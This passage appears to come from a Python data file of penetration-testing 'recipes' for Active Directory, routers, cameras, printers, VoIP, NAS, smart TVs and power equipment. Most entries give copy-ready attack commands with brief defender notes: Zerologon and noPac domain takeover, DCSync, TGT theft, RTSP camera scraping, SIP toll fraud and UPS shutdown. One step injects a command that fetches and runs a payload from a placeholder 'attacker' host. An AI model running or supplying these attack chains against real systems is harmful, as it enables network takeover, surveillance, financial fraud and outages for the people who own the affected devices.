        "match_any_category": ["vuln-version", "smb", "ad-weakness"],
        "description": ("Netlogon's AES-CFB8 IV bug lets an attacker reset the DC computer "
                        "account password to an empty string in ~256 attempts. From there: "
                        "DCSync → KRBTGT → domain. CVSS 10.0; patched August 2020."),
        "steps": [
            "Confirm vuln (non-destructive): `python3 zerologon_tester.py <dc-netbios> "
            "<dc-ip>` — only checks, doesn't change anything.",
            "Exploit: `python3 cve-2020-1472-exploit.py <dc-netbios> <dc-ip>` — sets "
            "the DC's machine account password to empty.",
            "DCSync with empty machine-account password: `impacket-secretsdump -just-dc "
            "-no-pass <dc-netbios>\\$@<dc-ip>` → KRBTGT hash.",
            "CRITICAL: restore the DC password BEFORE leaving the engagement, or AD "
            "replication breaks on next sync. "
            "`python3 reinstall_original_pw.py <dc-netbios> <dc-ip> <original-hash>` "
            "(extracted from a registry backup). Otherwise you take the domain offline.",
            "Defender side: KB4565351 (August 2020) + KB5004442 (DC enforcement). "
            "Monitor 4742 (computer account password change).",
        ],
        "tools": ["zerologon_tester", "cve-2020-1472-exploit (Secura/dirkjanm)",
                  "impacket secretsdump", "reinstall_original_pw"],
    },
    {
        "id": "nopac-sam-spoof",
        "name": "noPac (CVE-2021-42278/42287) — sAMAccountName spoof → DA",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["kerberos-weak", "ad-weakness", "ntlm-capture"],
        "description": ("Combine 42278 (no validation that machine account names end in $) "
                        "with 42287 (TGS-REQ falls back to the user's sAMAccountName lookup) "
                        "to request a TGS for the DC's computer account using a renamed "
                        "user-controlled machine. PAC contains DA SIDs → instant DA from "
                        "any domain-user account."),
        "steps": [
            "Create a machine account (default 10 per user via "
            "`ms-DS-MachineAccountQuota`): `impacket-addcomputer -computer-name PWN -computer-pass "
            "Pass123 <domain>/<user>:<pass>`.",
            "Run noPac: `python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc> -dc-host "
            "<dc-netbios> --impersonate Administrator -use-ldap`.",
            "Output: Administrator's NT hash. Use it: `impacket-psexec -hashes "
            ":<nthash> Administrator@<dc>` → SYSTEM on the DC.",
            "Land DCSync to dump the rest of the domain.",
            "Defender side: KB5008380 (Nov 2021 patch). Monitor 4741 (computer account "
            "created) + 4781 (account name changed) in close succession.",
        ],
        "tools": ["noPac (cube0x0)", "impacket addcomputer / psexec",
                  "Rubeus s4u2self (related exploitation)"],
    },
    {
        "id": "unconstrained-delegation",
        "name": "Unconstrained delegation → grab TGTs (PrinterBug + relay)",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["kerberos-weak", "ad-weakness", "smb"],
        "description": ("Any computer / user with TRUSTED_FOR_DELEGATION flagged stores a "
                        "forwarded TGT for every principal that authenticates to it. Coerce "
                        "a DC to authenticate (SpoolSample / PrinterBug, PetitPotam, DFSCoerce), "
                        "extract its TGT from your delegation-enabled host, replay as the DC."),
        "steps": [
            "Enumerate principals with unconstrained delegation: "
            "`impacket-findDelegation <domain>/<user>:<pass>` — note any computers "
            "OTHER than DCs (the DCs are expected).",
            "Land on one of those hosts (any local-admin path works).",
            "Coerce the DC to authenticate: `SpoolSample.exe \\\\<dc>.<domain> "
            "\\\\<your-host>.<domain>` (printerbug, MS-RPRN) OR "
            "`python3 PetitPotam.py <your-host> <dc>` (MS-EFSRPC).",
            "Capture the inbound TGT: on the delegation-enabled host run "
            "`Rubeus.exe monitor /interval:1 /nowrap` — the DC's TGT appears within seconds.",
            "Use it: `Rubeus.exe ptt /ticket:<b64>` → run `mimikatz lsadump::dcsync "
            "/user:krbtgt`.",
            "Defender side: clear TRUSTED_FOR_DELEGATION on non-tier-0 hosts; mark "
            "tier-0 accounts as 'Account is sensitive and cannot be delegated'.",
        ],
        "tools": ["impacket findDelegation", "Rubeus (monitor + ptt)",
                  "SpoolSample / PrinterBug", "PetitPotam", "DFSCoerce", "mimikatz"],
    },
    {
        "id": "smb-null-session",
        "name": "SMB null / anonymous session → IPC$ enumeration",
        "severity": "high",
        "phase": "recon",
        "match_any_category": ["smb", "exposed-service"],
        "description": ("Pre-Win2003 default and some Samba configs allow anonymous IPC$ "
                        "binding. From there: SAMR enumerates domain users + groups + "
                        "password policy; LSARPC enumerates SIDs → usernames. Same primitive "
                        "is how RID-cycling builds a full user list with no creds."),
        "steps": [
            "Test: `crackmapexec smb <subnet> -u '' -p '' --shares` — anonymous + share "
            "list per host.",
            "Enumerate users via RID cycling: `impacket-lookupsid <host>/anon@<host> "
            "-no-pass` or `enum4linux-ng -A -u '' -p '' <host>`.",
            "Pull password policy: `crackmapexec smb <host> -u '' -p '' --pass-pol` "
            "(threshold / lockout window — informs spray cadence).",
            "Feed users into the cred-spray path (see `cred-spray` recipe).",
            "Defender side: `RestrictAnonymous = 2` in policy, or block SMB from "
            "untrusted networks entirely. RID cycling specifically uses LSA — restrict "
            "with `RestrictAnonymousSAM`.",
        ],
        "tools": ["CrackMapExec", "enum4linux-ng", "impacket lookupsid / samrdump",
                  "rpcclient"],
    },
    {
        "id": "ldap-acl-abuse",
        "name": "LDAP / AD ACL abuse — GenericAll / WriteDACL → escalation",
        "severity": "high",
        "phase": "AD lateral",
        "match_any_category": ["cleartext-creds", "ad-weakness"],
        "match_substring": ["LDAP", "simple bind"],
        "description": ("Any captured LDAP credential opens BloodHound-grade enumeration. "
                        "Misconfigured ACLs on users/groups/computers (GenericAll, GenericWrite, "
                        "WriteOwner, WriteDACL, AddMember) shortcut to domain admin without "
                        "any exploit — just protocol-spec moves."),
        "steps": [
            "Collect with BloodHound: `bloodhound-python -u <user> -p '<pass>' -d "
            "<domain> -c All -ns <dc>`. Import the .zip into BloodHound GUI.",
            "Run analytic 'Shortest Paths to Domain Admins from Owned Principals'. "
            "Anything within ≤3 hops is opportunity.",
            "ACL action examples (impacket-dacledit + impacket-owneredit, or PowerView): "
            "`Add-DomainGroupMember -Identity 'Domain Admins' -Members <you>` on "
            "GenericAll on the group; force-change another user's password with "
            "`Set-DomainUserPassword -Identity <victim> -AccountPassword (...)` on "
            "User-Force-Change-Password.",
            "Shadow Credentials path on a target computer with msDS-KeyCredentialLink: "
            "`certipy shadow auto -u <user>@<domain> -p <pass> -account <victim>`.",
            "Defender side: BloodHound your own AD; remove unnecessary ACLs on "
            "high-privilege objects; apply tiering.",
        ],
        "tools": ["BloodHound (collector + GUI)", "impacket dacledit / owneredit",
                  "PowerSploit PowerView", "Certipy shadow"],
    },
    # ----- consumer / IoT / embedded device chains -----
    {
        "id": "router-admin-pwn",
        "name": "Residential router/gateway admin → CVE + cred reuse",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["router", "Router admin"],
        "description": ("Consumer ISP gear (Hitron, Technicolor, Arris, TP-Link) admin "
                        "UIs ship with vendor defaults, decade-old jQuery/AngularJS, and "
                        "command-injection CGIs. Once in, you control DNS, the upstream "
                        "WAN port-forwards, and Wi-Fi for everything on the LAN."),
        "steps": [
            "Hit the admin URL — note the model from the favicon/UI strings.",
            "Try the vendor's published default (Telus/Bell `admin/<wifi-key-on-sticker>`, "
            "Hitron `cusadmin/password`, Technicolor `admin/<8-hex-of-MAC>`).",
            "Vendor-CVE recon: `searchsploit <model>` + `cve.mitre.org` for the exact "
            "firmware string in the UI 'About' page. Hitron CGE/CGNV → CVE-2021-32574 "
            "(unauth RCE); TP-Link Archer family → CVE-2023-1389; D-Link DIR-* → many.",
            "Pivot: change DNS servers to your machine → strip TLS / inject "
            "updates → captive-portal exfil. Port-forward your IP to internal RDP/SSH.",
            "Defender side: rotate the default password the moment a new gateway is "
            "racked; apply the ISP's auto-update; if WAN admin is exposed, file a "
            "CR to disable it.",
        ],
        "tools": ["routersploit", "Burp Suite (UI fuzz)", "exploitdb / vendor CVE list",
                  "nmap (banner + http-enum)"],
    },
    {
        "id": "stb-dial-pwn",
        "name": "Set-top box — DIAL launch + DHCP upgrade-url + GENA SSRF",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["Set-top box", "STB", "DIAL"],
        "description": ("STBs (Zenterio/Roku/Vizio class) ship a DIAL receiver that takes "
                        "unauth app-launch POSTs from any LAN host, a GENA event server "
                        "that reflects to attacker-supplied CALLBACK URLs (SSRF / amplifier), "
                        "and a DHCP-driven firmware-upgrade URL (option 40) usable from "
                        "any rogue DHCP on the segment."),
        "steps": [
            "Fingerprint: `curl -s http://<stb>:<port>/xml/dd.xml` reveals UDN, model, "
            "controlURL + eventSubURL. Server header `Linux/... UPnP/1.1 <stack>/<ver>` "
            "pins the firmware.",
            "DIAL CSRF: POST to `/apps/<AppName>` with text/plain body — most receivers "
            "skip CORS preflight on simple POST. Inject payload bodies the app trusts "
            "(YouTube pairing, Netflix nflxso URL, custom additionalData).",
            "GENA SSRF: `SUBSCRIBE <eventSubURL>` with `CALLBACK: <http://127.0.0.1:<port>/>` "
            "→ STB POSTs NOTIFY to localhost-only services it can reach but you can't.",
            "DHCP upgrade-url MITM: stand up a rogue DHCP on the segment serving option 40 "
            "or vendor option 43/125 (BBF VIVSO for TR-069). Plain-HTTP firmware "
            "bootstrap URLs (`http://...cdn.../config.ini`) become attacker-controlled.",
            "TLS-pinning bypass: portal URL HTTPS uses the device cert store — drop "
            "a trusted CA via the gateway path above and you serve replacement boot UI "
            "with full JS-API access.",
            "Defender side: signed boot URLs only, strict CORS + Origin on DIAL, "
            "GENA CALLBACK whitelist (deny private IPs), pin the upgrade CDN cert.",
        ],
        "tools": ["curl + custom DIAL POSTs", "ssdp.py / upnpc",
                  "Python rogue DHCP (scapy) for option 40 / 43 fuzz",
                  "mitmproxy (portal-URL transparent intercept)"],
    },
    {
        "id": "printer-pjl-pillage",
        "name": "Printer — PJL/PostScript pillage on tcp/9100",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["Printer", "9100"],
        "description": ("JetDirect 9100 is a raw socket: PJL commands list every spool "
                        "job, dump the address book, change the panel display, and on many "
                        "models read arbitrary files off the embedded filesystem. PostScript "
                        "to the same port executes arbitrary procedures with file access."),
        "steps": [
            "Connect with PRET: `python3 pret.py <ip> pjl` (or `ps`). Try `info config`, "
            "`info filesys`, `info id`.",
            "Pull spool jobs already on the printer: `pjl> ls 0:/saveDevice/SavedJobs/"
            "InProgress/`.",
            "Dump the address book (HP MFP class): `pjl> get 0:/.../addressbook.csv` "
            "— often contains corporate email + SMB share creds for scan-to-folder.",
            "Capture upcoming print jobs: `pjl> capture start` then wait; jobs land in "
            "the printer's filesystem and you exfil them.",
            "Change the LCD message (proof of access, low-impact): `pjl> display "
            "\"PWNED\"`.",
            "IPP variant: `ipptool -tv ipp://<ip>/ipp/print get-jobs.test` enumerates "
            "queues without auth on default deployments.",
        ],
        "tools": ["PRET", "ipptool (cups)", "metasploit auxiliary/admin/printer/* "],
    },
    {
        "id": "ipcam-default-rtsp",
        "name": "IP camera — Hikvision/Dahua defaults + RTSP scrape",
        "severity": "critical",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["Hikvision", "Dahua", "RTSP", "camera"],
        "description": ("IP cameras ship with hardcoded credentials, accept unauth SDK "
                        "calls, and serve RTSP without auth on the standard path. Once "
                        "you have the stream you have video; once you have the SDK API "
                        "you control PTZ, exports, and (on some firmware) the host OS."),
        "steps": [
            "Hikvision: confirm via `curl -s http://<ip>/Security/users?auth=YWRtaW46MTIzNDU=` "
            "(default admin/12345 base64). CVE-2017-7921 unauth: "
            "`http://<ip>/system/configurationFile?auth=YWRtaW46MTEK` dumps cfg + creds.",
            "Dahua: CVE-2021-33044/33045 — POST `{ \"method\": \"global.login\", \"params\": "
            "{\"clientType\": \"NetKeyboard\"} }` to /RPC2_Login bypasses auth.",
            "Generic RTSP: `ffprobe rtsp://<ip>/Streaming/Channels/1` (Hikvision), "
            "`rtsp://<ip>/cam/realmonitor?channel=1&subtype=0` (Dahua), or "
            "`rtsp://<ip>/h264.sdp`. Test with and without `admin:admin`.",
            "Persistence: many cameras run a busybox shell — `telnet <ip>` on root/blank.",
            "Defender side: firmware patch; isolate cameras to a no-egress VLAN; force "
            "new admin password at install (modern Hikvision/Dahua firmware enforces this).",
        ],
        "tools": ["Cameradar", "Camerattack", "iSpy/ONVIFManager", "ffprobe / VLC",
                  "metasploit exploit/linux/http/dlink_dir850l_unauth_exec (related)"],
    },
    {
        "id": "voip-sip-takeover",
        "name": "SIP/VoIP — extension enum, registrar brute, toll fraud",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["SIP", "VoIP"],
        "description": ("UDP/5060 lets you OPTIONS-ping the PBX, OPTIONS/REGISTER scan "
                        "for valid extensions, then digest-auth brute. Registered as a "
                        "phone you can place outbound calls billed to the company."),
        "steps": [
            "Enumerate extensions: `svwar -e100-9999 <pbx>` (SIPVicious) — distinguishes "
            "401 (valid ext, wrong pass) from 404 (no ext).",
            "Brute the digest: `svcrack -u <ext> -d passwords.txt <pbx>`. Phones often "
            "use their own extension as the password.",
            "Once registered, place a call: `baresip -e '/dial 011<intl>'` — outbound "
            "to a high-rate destination = toll fraud (10s of thousands of dollars in "
            "minutes if the PBX has no rate-limiting).",
            "RTP eavesdrop: `tshark -i <iface> -f 'udp portrange 10000-20000' -T "
            "rtp.payload` + Wireshark Telephony → RTP Streams → Play.",
            "Defender side: TLS-SIP (5061) + SRTP; geo-fence allowed-destinations "
            "and rate-limit outbound INVITEs at the SBC.",
        ],
        "tools": ["SIPVicious (svwar / svcrack / svmap)", "Mr.SIP", "PJSUA / baresip",
                  "Wireshark RTP analysis"],
    },
    {
        "id": "cwmp-acs-hijack",
        "name": "TR-069 / CWMP — rogue ACS → mass gateway takeover",
        "severity": "critical",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["TR-069", "CWMP", "7547"],
        "description": ("CWMP (TCP/7547) is the ISP's management channel. Exposed to the "
                        "WAN it's been Mirai's foothold for years (CVE-2016-10372 command "
                        "injection in NewNTPServer / SetParameterValues). Locally on the "
                        "LAN, a rogue ACS pushes a new config to every gateway."),
        "steps": [
            "Confirm WAN exposure: `nmap -p7547 --open <ip-range>`.",
            "Test CVE-2016-10372 (the original Mirai variant): "
            "`curl -d '<...NewNTPServer1>;wget -O /tmp/x http://attacker/x;sh /tmp/x;...</...>' "
            "http://<gw>:7547/UD/act?1`.",
            "Local ACS hijack (rogue): change DHCP option 43 / 125 vendor-specific to "
            "`URL=http://attacker/acs;Username=...;Password=...`. Every gateway on the "
            "segment polls you on next periodic-inform.",
            "Push config: serve a CWMP Inform reply with `SetParameterValues` containing "
            "InternetGatewayDevice.ManagementServer.URL and credential params → "
            "ownership stays after reboot.",
            "Defender side: 7547 ingress allowed only from the ISP's known ACS CIDRs; "
            "patch firmware; use TLS-CWMP (`https://` ACS URL) with certificate pinning.",
        ],
        "tools": ["GenieACS (legit, useful for understanding)",
                  "metasploit auxiliary/scanner/http/tr069_ntpserver",
                  "Python rogue DHCP (scapy)"],
    },
    {
        "id": "mqtt-broker-pillage",
        "name": "MQTT broker — anon SUBSCRIBE → every IoT device's telemetry",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["MQTT"],
        "description": ("Default Mosquitto/HiveMQ allows anonymous connect with no ACL. "
                        "Subscribing to `#` pulls every topic; publishing to `homeassistant/` "
                        "or `zwave/` topics actuates devices."),
        "steps": [
            "Connect anonymous: `mosquitto_sub -h <broker> -t '#' -v` — wildcard "
            "subscription. Every device's telemetry streams to your terminal.",
            "Look for credentials in topics: many IoT devices publish their config "
            "(WiFi PSK, API tokens, MAC + serial) at startup under `device/<id>/info`.",
            "Actuate: `mosquitto_pub -h <broker> -t 'homeassistant/light/<id>/set' "
            "-m '{\"state\":\"on\",\"brightness\":255}'`.",
            "Subscribe to retain-flag = true messages → historical config snapshots.",
            "Defender side: `allow_anonymous false` in mosquitto.conf + ACL file per "
            "client cert / username; 8883 with mutual TLS; never expose 1883 outside "
            "the device VLAN.",
        ],
        "tools": ["mosquitto-clients (sub/pub)", "MQTTX", "metasploit "
                  "auxiliary/gather/mqtt_subscribe"],
    },
    {
        "id": "cast-screen-hijack",
        "name": "Chromecast / Google Cast — LAN-CSRF screen hijack",
        "severity": "medium",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["Chromecast", "Cast"],
        "description": ("Cast receivers (8008/8009) accept app-launch from any device on the "
                        "LAN with no auth. A webpage running on a phone joined to the same "
                        "Wi-Fi can throw a screen to every Chromecast in the office. "
                        "CastHack (2018) abused this at scale."),
        "steps": [
            "Discover: `dns-sd -B _googlecast._tcp` or mDNS over the LAN. Each receiver's "
            "friendly name + IP becomes a target.",
            "App-launch: POST to `http://<cast>:8008/apps/YouTube` with body "
            "`v=<youtube-id>&t=0` — that video plays on the TV instantly.",
            "Custom payload: register a free Cast developer app, then POST your app's "
            "ID. Your receiver-side JS runs on the TV with full media-namespace control.",
            "Persistence: receivers cache the last URL — if your launch URL was an HTTPS "
            "page with permanent JS that polls for commands, it stays after the screen "
            "looks idle.",
            "Defender side: enable 'Guest mode = off' on each receiver; isolate cast "
            "endpoints to a media-only VLAN; block port 8008 inbound from user VLANs.",
        ],
        "tools": ["pychromecast", "go-chromecast", "BeeCast", "Castle"],
    },
    {
        "id": "ipmi-rakp-crack",
        "name": "IPMI BMC — RAKP+1 hash crack → KVM + virtual-media RCE",
        "severity": "critical",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["IPMI", "BMC"],
        "description": ("IPMI 2.0's RAKP+1 message contains an HMAC of the user's password — "
                        "any anonymous probe can request it, then crack offline. With root "
                        "on the BMC you attach a virtual CD-ROM and boot the host into "
                        "whatever you want."),
        "steps": [
            "Dump the RAKP hash: `ipmitool -I lanplus -H <bmc> -U admin -P 'x' user "
            "list` triggers it. Capture with the metasploit module "
            "`auxiliary/scanner/ipmi/ipmi_dumphashes` — outputs a hashcat-ready string.",
            "Crack: `hashcat -m 7300 hashes rockyou.txt` — generally fast because BMC "
            "default passwords are short.",
            "If `cipher 0` is enabled: skip the crack, "
            "`ipmitool -I lanplus -C 0 -H <bmc> -U <any> -P <any> user list` works "
            "without a valid password.",
            "With root: launch the Java/HTML5 KVM, mount a Kali ISO via Virtual Media, "
            "reboot the host, single-user shell → /etc/shadow.",
            "Defender side: BMC on a dedicated mgmt VLAN no L3 to user nets; disable "
            "cipher 0 (`ipmitool lan set 1 cipher_privs Xaaaaaaaaaaaaaa`); strong "
            "admin password.",
        ],
        "tools": ["ipmitool", "hashcat (mode 7300)", "metasploit ipmi_dumphashes",
                  "iDRAC / iLO native KVM via web"],
    },
    {
        "id": "nas-cve-pillage",
        "name": "NAS appliance (Synology/QNAP) — vendor CVE → root + data",
        "severity": "critical",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["NAS", "Synology", "QNAP"],
        "description": ("Consumer/SMB NAS units are first-class ransomware targets: QLocker, "
                        "DeadBolt, QSnatch, Synolocker. The vendors' CVE lists average a "
                        "high-severity unauth-RCE every 2-3 months — patching lag is the "
                        "norm because owners don't realize the box has its own OS."),
        "steps": [
            "Banner-grab the DSM/QTS web UI: `curl -s -k https://<nas>:5001/webapi/entry.cgi"
            "?api=SYNO.API.Info&method=Query&version=1` reveals exact build.",
            "Recent example chains: Synology DSM CVE-2024-10446 (Hyper Backup auth bypass); "
            "QNAP CVE-2024-21899 weak-creds → admin; QNAP CVE-2022-27593 (DeadBolt) — pick "
            "the right exploit for the build.",
            "Pull `/etc/shadow` after root → crack offline. Pivot to AD via SMB share "
            "credentials cached on the NAS.",
            "Loot: shares often hold finance/HR; check `/volume1/homes/<user>/` for SSH "
            "keys + cloud-cli credentials.",
            "Defender side: patch within 48h of vendor advisory; never expose DSM/QTS "
            "or QuickConnect/myQNAPcloud to the internet; isolate NAS to a server VLAN.",
        ],
        "tools": ["Burp Suite", "metasploit (Synology/QNAP modules)",
                  "exploitdb / vendor PSIRT"],
    },
    {
        "id": "wps-pixie-dust",
        "name": "Wi-Fi WPS Pixie-Dust → recover PSK in seconds",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["WPS", "Quantenna", "WFADevice"],
        "description": ("Pixie-Dust (Bongard 2014) attacks the offline-derivable nonces in "
                        "the WPS Registrar exchange on vulnerable chipsets (Ralink, Realtek, "
                        "older Broadcom, some Quantenna). One handshake → PIN → PSK, no "
                        "online brute needed."),
        "steps": [
            "Capture the AP: `airmon-ng start <iface>`; `wash -i <mon>` lists WPS-enabled APs "
            "with their VendorID — that tells you if Pixie is likely.",
            "Run Pixie via Reaver: `reaver -i <mon> -b <bssid> -K 1 -vvv`. Vulnerable "
            "chipsets crack in <5 s.",
            "If Pixie fails but the AP has no PIN lockout: online brute "
            "`reaver -i <mon> -b <bssid>` — 11 k PINs total.",
            "PSK falls out of the WPS exchange directly. Connect, then pivot LAN-side.",
            "Defender side: disable WPS at the AP admin UI (the only fix); if a captive "
            "client mode forces WPS on, swap the AP.",
        ],
        "tools": ["aircrack-ng (airmon/wash)", "Reaver (Pixie mode)",
                  "bully", "wifite (automation)"],
    },
    {
        "id": "tftp-config-pull",
        "name": "TFTP — pull running configs / firmware off network gear",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["TFTP"],
        "description": ("TFTP is unauth read/write. Most enterprises run a TFTP server next "
                        "to their switches/phones for config backup. Guess the filename "
                        "(predictable: `<hostname>-confg`, `running-config`, `e1000.img`) "
                        "and you have every device's secrets."),
        "steps": [
            "Probe: `tftp <server>` then `get running-config` / `get <hostname>-confg` "
            "/ `get <hostname>.cfg`. Cisco IOS auto-backups use the device hostname.",
            "Mass-pull: `nmap -p69 --script tftp-enum --script-args tftp-enum.filelist=names.txt "
            "<server>`. Custom names list per environment.",
            "Cisco config parsing: extract Type-7 (instant), enable secret (hashcat 5700/9200), "
            "SNMP RW community, VTY ACLs, TACACS server IP + key (often weak/recycled).",
            "Voice configs: 7920/CP-7960 phones pull `SEP<mac>.cnf.xml` → extension creds.",
            "Defender side: TFTP only between a config-backup server and authorized devices "
            "on a mgmt VLAN; everywhere else block UDP/69.",
        ],
        "tools": ["tftp client", "nmap tftp-enum NSE", "metasploit auxiliary/admin/tftp/*"],
    },
    {
        "id": "smart-tv-pwn",
        "name": "Smart TV — LAN-CSRF, debug-port shell, app injection",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["Smart TV"],
        "description": ("Smart TVs (Samsung Tizen, LG webOS, Vizio SmartCast, Android TV) "
                        "run aging WebKit/Chromium with DIAL + HbbTV + vendor-specific REST "
                        "APIs. Same-LAN attackers control input, mount payloads via "
                        "side-loaded apps, or hit debug ports the vendor forgot to close."),
        "steps": [
            "Vendor fingerprint: `curl -s http://<tv>:1925/system` (Philips JointSpace), "
            "`http://<tv>:8001/api/v2/` (Samsung), `http://<tv>:3001/` (LG webOS) → "
            "model + firmware version.",
            "Samsung Tizen: WebSocket API at `ws://<tv>:8001/api/v2/channels/samsung."
            "remote.control` accepts arbitrary KEY events with no auth on most pre-2022 "
            "firmware (RemoteApp pairing bug).",
            "LG webOS: hbbtv + DIAL launch take input from the same LAN. CVE-2023-6317 / "
            "-6318 / -6319 chain → root over the LAN admin port.",
            "Vizio SmartCast: HTTPS API on 9000/443, undocumented `key_command` endpoints "
            "accept input with the pairing token stored in the app's preferences.",
            "If a debug port (`adb` on 5555 for Android TV, `telnet` on 23 for older "
            "webOS) is open: instant root.",
            "Defender side: media VLAN with no egress to user devices; vendor firmware "
            "updates; disable network input on TVs that don't need cast/airplay.",
        ],
        "tools": ["curl + websocat", "samsung-tv-ws-api", "lg-tv-exploit (TheSmartHacker)",
                  "adb (Android TV)", "TizenBrew"],
    },
    {
        "id": "airplay-receiver-pwn",
        "name": "AirPlay receiver — LAN media push + protocol CVE chain",
        "severity": "medium",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["AirPlay"],
        "description": ("AirPlay 1 / 2 receivers (Apple TV, third-party speakers, modern "
                        "TVs) accept anonymous media-push by default. AirPlay 2 protocol "
                        "had multiple LAN-reachable bugs (CVE-2021-30892 / -30877 in older "
                        "tvOS, AirBorne CVEs in third-party libs)."),
        "steps": [
            "Discover: `dns-sd -B _airplay._tcp` then `_raop._tcp` for audio. Note "
            "model/firmware in TXT records.",
            "Push media: `atvremote --id <atv-id> play_url http://<your-server>/film.mp4`. "
            "Older Apple TVs / TVs accept this without pairing.",
            "Cred capture: AirPlay 1 used SAP/MAYDAY anonymous authentication; capture "
            "the pairing PIN flow with Wireshark `airtunes` dissector for offline crack.",
            "AirBorne (April 2025) third-party AirPlay-SDK CVEs: many smart speakers "
            "running unpatched SDK fall to LAN unauth RCE.",
            "Defender side: enable AirPlay password per receiver; restrict to a guest "
            "Wi-Fi; firmware ≥ tvOS 15.1.",
        ],
        "tools": ["atvremote (pyatv)", "OwnTone (audio interop)",
                  "Wireshark airtunes/RAOP dissector", "AirBorne PoC tools"],
    },
    {
        "id": "plex-rce-chain",
        "name": "Plex Media Server — known CVEs → server RCE",
        "severity": "critical",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["Plex"],
        "description": ("Plex on tcp/32400 has had repeated unauth/auth-bypass RCEs "
                        "(CVE-2020-5740 Python pickle deserialization → RCE; CVE-2023-25193 "
                        "Plex Relay token exposure; SSRF + path traversal earlier years). "
                        "Plex.tv cloud-account compromise also pivots in."),
        "steps": [
            "Banner: `curl -s -k 'http://<plex>:32400/identity'` → version. Match the "
            "exact version against Plex changelog for known CVEs.",
            "If pre-1.19.3 (CVE-2020-5740): photo-library `Camera Upload` pickle RCE — "
            "PoC is public.",
            "If owner reuses their Plex.tv account password elsewhere: the cloud bridge "
            "auto-authenticates on every LAN client → effective LAN admin.",
            "Token exposure: `https://plex.tv/api/resources?X-Plex-Token=...` from a "
            "stolen pin grants server-list and remote-control privileges.",
            "Defender side: patch immediately; require 2FA on the Plex.tv account; "
            "disable Remote Access if not needed.",
        ],
        "tools": ["curl + jq", "CVE-2020-5740 PoC (mauricelambert / publicly available)",
                  "Plex CLI tools"],
    },
    {
        "id": "octoprint-rce-takeover",
        "name": "OctoPrint / Klipper-Moonraker — anon API → arbitrary G-code",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["OctoPrint", "Klipper"],
        "description": ("OctoPrint / Mainsail / Fluidd ship with no auth on the REST API "
                        "by default. Upload G-code = print whatever you want. Disable "
                        "thermal-runaway in printer config + send a malicious G-code = "
                        "fire hazard."),
        "steps": [
            "Probe: `curl -s http://<host>:5000/api/version`. Without an API key the "
            "endpoint responds — that's a misconfiguration in itself.",
            "Upload: `curl -X POST -H 'X-Api-Key: <key-or-blank>' -F file=@pwn.gcode "
            "http://<host>:5000/api/files/local?select=true&print=true`.",
            "Klipper / Moonraker: WebSocket on 7125 — same surface. `moonraker-api` "
            "Python client.",
            "Defender side: enable access control wizard in OctoPrint; require API "
            "key on Moonraker; never expose 5000/7125 outside LAN.",
        ],
        "tools": ["curl", "moonraker-api", "OctoPrint Plugin API"],
    },
    {
        "id": "hue-bridge-link",
        "name": "Philips Hue / Lutron — local API exposure + link-button bypass",
        "severity": "medium",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["light hub"],
        "description": ("Hue creates a username when the link button is pressed; the API "
                        "is then plaintext-HTTP with no per-request auth. Once you have "
                        "the username token, you own every light + dependent automation."),
        "steps": [
            "Probe: `curl http://<bridge>/api/<token>/config`. If you don't have a token, "
            "social-engineer a press of the link button (or capture from a partner "
            "device's HAR file).",
            "Recon: `curl http://<bridge>/api/<token>/lights` enumerates every fixture; "
            "`/groups`, `/scenes`, `/sensors` (motion data).",
            "Actuate: `curl -X PUT http://<bridge>/api/<token>/lights/1/state -d "
            "'{\"on\":false}'`. Useful as proof; combined with sensor data, gives a "
            "presence-detection oracle.",
            "Defender side: bridge on isolated VLAN; rotate tokens (delete unused "
            "`whitelist` entries); patch firmware (CVE-2020-6007 buffer overflow over "
            "Zigbee was bridge-RCE-class).",
        ],
        "tools": ["curl", "phue (Python)", "Hue Essentials"],
    },
    {
        "id": "nut-ups-control",
        "name": "Network UPS (NUT) — status read + shutdown command",
        "severity": "medium",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["NUT", "UPS"],
        "description": ("NUT on tcp/3493 lets you read UPS status without auth and — "
                        "with a low-priv password — issue shutdown commands. Bringing "
                        "down a UPS during business hours powers off whatever's behind "
                        "it (servers, switches, sometimes datacenter rows)."),
        "steps": [
            "Read: `upsc <ups>@<host>` shows model + battery + load. "
            "`upsc -L <host>` lists every configured UPS.",
            "Acquire creds: NUT shared creds usually live in /etc/nut/upsmon.conf on "
            "the monitor host (which often runs other services with weaker security).",
            "Shutdown: `upscmd -u <user> -p <pass> <ups>@<host> shutdown.return` — "
            "the load drops, the UPS shuts down at its configured grace period.",
            "Defender side: 3493 restricted to monitor host; auth required on every "
            "command (`monuser` separate from `admin`); UPS on dedicated mgmt VLAN.",
        ],
        "tools": ["upsc / upscmd / upsrw (NUT)", "Metasploit auxiliary/admin/scada/nut"],
    },
    {
        "id": "apc-nmc-pillage",
        "name": "APC NMC / Eaton ePDU — default creds + SNMP outlet control",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["APC", "Eaton", "power management"],
        "description": ("APC Network Management Cards (NMC) and Eaton ePDUs default to "
                        "`apc/apc` (web) and SNMP `public` / `private`. With either, "
                        "you can power-cycle, schedule outage windows, or simply "
                        "outlet-off mission-critical equipment."),
        "steps": [
